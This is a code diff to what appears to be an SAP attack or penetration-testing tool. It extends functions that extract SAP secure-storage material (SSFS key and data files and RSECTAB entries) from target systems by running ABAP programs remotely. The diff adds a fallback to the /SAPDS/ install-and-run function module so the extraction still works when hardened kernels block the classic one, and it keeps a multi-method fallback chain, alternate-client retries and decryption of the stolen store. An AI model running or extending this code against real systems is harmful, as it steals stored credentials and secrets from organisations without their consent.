@@ -380,9 +380,14 @@ _ABAP_READ_SSFS_FILES = [
 
 def _read_ssfs_files_via_abap(node, creds,
                                soap_session=None) -> tuple:
-    """Read SSFS KEY and DAT files from the SAP OS via RFC_ABAP_INSTALL_AND_RUN.
+    """Read SSFS KEY and DAT files from the SAP OS via ABAP install-and-run.
 
-    Returns (key_bytes, dat_bytes) — either or both may be None if not available.
+    Returns (key_bytes, dat_bytes, fm_name).  key_bytes / dat_bytes may
+    be None if not available.  ``fm_name`` is the RFC function module
+    that actually ran on the target — one of ``RFC_ABAP_INSTALL_AND_RUN``
+    (classic) or ``/SAPDS/RFC_ABAP_INSTALL_RUN`` (SAP Data Services
+    variant used when the classic FM is not RFC-exposed on hardened
+    kernels).  ``None`` if neither FM was available.
 
     Phase 3b: when ``soap_session`` is supplied, routes the ABAP
     OPEN DATASET program over SOAP-RFC instead of pyrfc → eliminates
@@ -399,11 +404,13 @@ def _read_ssfs_files_via_abap(node, creds,
                 res = sapmap_rfc._run_abap_program(
                     conn, _ABAP_READ_SSFS_FILES, "ZSECSSFS")
 
+        fm_name = res.get("fm_name")
+
         if not res.get("success"):
             client_label = creds.client if creds else "?"
             print(f"[-] {node.sid} client {client_label}: "
                   f"SSFS file read failed: {res.get('error')}")
-            return None, None
+            return None, None, fm_name
 
         output = res.get("output", [])
         key_b64_parts = []
@@ -444,11 +451,11 @@ def _read_ssfs_files_via_abap(node, creds,
             except Exception as e:
                 print(f"[-] SSFS DAT base64 decode failed: {format_rfc_exception(e)}")
 
-        return key_bytes, dat_bytes
+        return key_bytes, dat_bytes, fm_name
 
     except Exception as e:
         print(f"[-] SSFS file read error: {format_rfc_exception(e)}")
-        return None, None
+        return None, None, None
 
 
 def _read_ssfs_files_via_sxpg(node, creds, soap_route=None) -> tuple:
@@ -1148,18 +1155,22 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
     rsectab_method = None # which method actually retrieved RSECTAB rows
 
     print(f"[*] SecStore {node.sid}: SSFS+RSECTAB fallback chain — "
-          f"1) SSFS/OS via ABAP exec  2) SSFS/OS via SXPG  "
-          f"3) RSECTAB via RFC_ABAP_INSTALL_AND_RUN  "
+          f"1) SSFS/OS via ABAP INSTALL_AND_RUN (classic or /SAPDS/)  "
+          f"2) SSFS/OS via SXPG  "
+          f"3) RSECTAB via ABAP INSTALL_AND_RUN (classic or /SAPDS/)  "
           f"4) RSECTAB via SXPG DB CLI  5) RSECTAB via RFC_READ_TABLE")
 
     # --- Method 1: Try to read SSFS files from OS via ABAP exec ---
     print(f"[*] SecStore {node.sid}: [Method 1] reading SSFS files from OS "
-          f"filesystem via RFC_ABAP_INSTALL_AND_RUN...")
-    key_bytes, dat_bytes = _read_ssfs_files_via_abap(
+          f"filesystem via ABAP INSTALL_AND_RUN "
+          f"(probes RFC_ABAP_INSTALL_AND_RUN → /SAPDS/RFC_ABAP_INSTALL_RUN)...")
+    key_bytes, dat_bytes, ssfs_fm = _read_ssfs_files_via_abap(
         node, creds, soap_session=soap_session)
     if key_bytes or dat_bytes:
-        ssfs_method = "Method 1 (SSFS files via RFC_ABAP_INSTALL_AND_RUN)"
-        print(f"[+] SecStore {node.sid}: [Method 1] SSFS files retrieved")
+        ssfs_method = (f"Method 1 (SSFS files via "
+                       f"{ssfs_fm or 'ABAP INSTALL_AND_RUN'})")
+        print(f"[+] SecStore {node.sid}: [Method 1] SSFS files retrieved via "
+              f"{ssfs_fm or 'ABAP INSTALL_AND_RUN'}")
 
     # Detect "not permitted" error — SSFS read uses ABAP exec
     if key_bytes is None and dat_bytes is None:
@@ -1211,13 +1222,15 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
 
     # --- Method 3: Read RSECTAB via RFC_ABAP_INSTALL_AND_RUN ---
     print(f"[*] SecStore {node.sid}: [Method 3] reading RSECTAB entries via "
-          f"RFC_ABAP_INSTALL_AND_RUN (ABAP report ZSECSTORE)...")
-    rows = _read_rsectab_via_abap(
+          f"ABAP INSTALL_AND_RUN "
+          f"(probes RFC_ABAP_INSTALL_AND_RUN → /SAPDS/RFC_ABAP_INSTALL_RUN)...")
+    rows, rsectab_fm = _read_rsectab_via_abap(
         node, creds, soap_session=soap_session)
     if rows:
-        rsectab_method = "Method 3 (RSECTAB via RFC_ABAP_INSTALL_AND_RUN)"
+        rsectab_method = (f"Method 3 (RSECTAB via "
+                          f"{rsectab_fm or 'ABAP INSTALL_AND_RUN'})")
         print(f"[+] SecStore {node.sid}: [Method 3] {len(rows)} RSECTAB rows "
-              f"retrieved")
+              f"retrieved via {rsectab_fm or 'ABAP INSTALL_AND_RUN'}")
 
     if rows is None:
         abap_blocked = True
@@ -1262,7 +1275,7 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
                 if key_bytes is None:
                     print(f"[*] {node.sid}: Retrying SSFS read via "
                           f"client {alt_client}...")
-                    key_bytes, dat_bytes = _read_ssfs_files_via_abap(
+                    key_bytes, dat_bytes, _ = _read_ssfs_files_via_abap(
                         node, alt_creds)
                     if key_bytes:
                         try:
@@ -1285,14 +1298,14 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
 
                 # Retry RSECTAB with alternative client
                 print(f"[*] {node.sid}: [Method 3, retry] retrying RSECTAB "
-                      f"read via RFC_ABAP_INSTALL_AND_RUN in client "
+                      f"read via ABAP INSTALL_AND_RUN in client "
                       f"{alt_client}...")
-                rows = _read_rsectab_via_abap(
+                rows, retry_fm = _read_rsectab_via_abap(
                     node, alt_creds, soap_session=soap_session)
                 if rows:
                     rsectab_method = (f"Method 3 (RSECTAB via "
-                                      f"RFC_ABAP_INSTALL_AND_RUN, client "
-                                      f"{alt_client})")
+                                      f"{retry_fm or 'ABAP INSTALL_AND_RUN'}"
+                                      f", client {alt_client})")
                     print(f"[+] {node.sid}: SecStore read succeeded via "
                           f"client {alt_client}")
                     break
@@ -1335,8 +1348,8 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
 
 
 def _read_rsectab_via_abap(node, creds,
-                            soap_session=None) -> list | None:
-    """Read RSECTAB via RFC_ABAP_INSTALL_AND_RUN.
+                            soap_session=None) -> tuple:
+    """Read RSECTAB via ABAP install-and-run.
 
     When ``soap_session`` is supplied AND the gateway port is
     unreachable, runs the ABAP program over SOAP-RFC instead of pyrfc.
@@ -1345,8 +1358,12 @@ def _read_rsectab_via_abap(node, creds,
     after Create Remote User silently times out on every chunked
     INSTALL_AND_RUN attempt.
 
-    Returns list of (ident, data_hex) tuples, or None if the FM is not
-    available.
+    Returns ``(rows, fm_name)`` where rows is a list of
+    ``(ident, data_hex)`` tuples or ``None`` if the FM was not
+    available.  ``fm_name`` is the RFC function module the target
+    actually accepted — ``RFC_ABAP_INSTALL_AND_RUN`` or
+    ``/SAPDS/RFC_ABAP_INSTALL_RUN`` — so callers can surface the
+    exact FM in status/summary output.
     """
     try:
         if soap_session is not None:
@@ -1359,14 +1376,16 @@ def _read_rsectab_via_abap(node, creds,
                 res = sapmap_rfc._run_abap_program(
                     conn, _ABAP_READ_RSECTAB, "ZSECSTORE")
 
+        fm_name = res.get("fm_name")
+
         if not res.get("success") and "not available" in (res.get("error") or ""):
-            return None  # FM not available — caller will fall back
+            return None, fm_name  # FM not available — caller will fall back
 
         if not res.get("success"):
             client_label = creds.client if creds else "?"
             print(f"[-] {node.sid} client {client_label}: "
                   f"SecStore ABAP exec error: {res.get('error')}")
-            return None
+            return None, fm_name
 
         output = res.get("output", [])
         print(f"[*] SecStore ABAP output: {len(output)} lines")
@@ -1397,11 +1416,11 @@ def _read_rsectab_via_abap(node, creds,
         # Flush last entry
         if cur_ident is not None and cur_hex:
             rows.append((cur_ident, cur_hex.replace(" ", "").upper()))
-        return rows
+        return rows, fm_name
 
     except Exception as e:
         print(f"[-] SecStore ABAP read failed: {format_rfc_exception(e)}")
-        return None
+        return None, None
 
 
 def _read_rsectab_via_rfc(node, creds, soap_session=None) -> list | None:
